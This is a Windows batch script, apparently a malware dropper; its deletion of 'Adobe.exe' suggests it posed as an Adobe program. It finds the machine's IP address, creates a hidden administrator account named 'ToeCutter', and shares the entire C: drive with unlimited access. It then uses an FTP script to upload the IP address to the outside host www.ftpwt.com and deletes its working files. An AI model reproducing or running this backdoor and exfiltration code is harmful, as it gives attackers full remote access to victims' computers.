@echo off
echo e 100 "call temp2.bat "> script
echo rcx>> script
echo f>> script
echo n temp.txt>> script
echo w>> script
echo q>>script
debug < script > junk
del script
echo set IP=%%2> temp2.bat
copy temp.txt temp1.bat > junk
ping.exe -n 1 -i 1 -w 1 www.microsoft.com > junk
arp.exe -a | find "Interface" >> temp1.bat
call temp1.bat
del temp1.bat
del temp2.bat
del temp.txt
del junk
echo Your IP is %IP%
echo.Your IP is %IP%>%IP%.txt
net user ToeCutter /add
net localgroup administrators ToeCutter /add
net share system=C:\ /unlimited
ECHO.10100101>>two.txt
ECHO.10100101>>two.txt
ECHO.cd /01>>two.txt
ECHO.pwd>>two.txt
ECHO.ascii>>two.txt
ECHO.put %IP%.txt>>two.TXT
ECHO.quit>>two.txt
ftp -s:two.txt www.ftpwt.com
del two.txt
del %IP%.txt
del junk
del Adobe.exe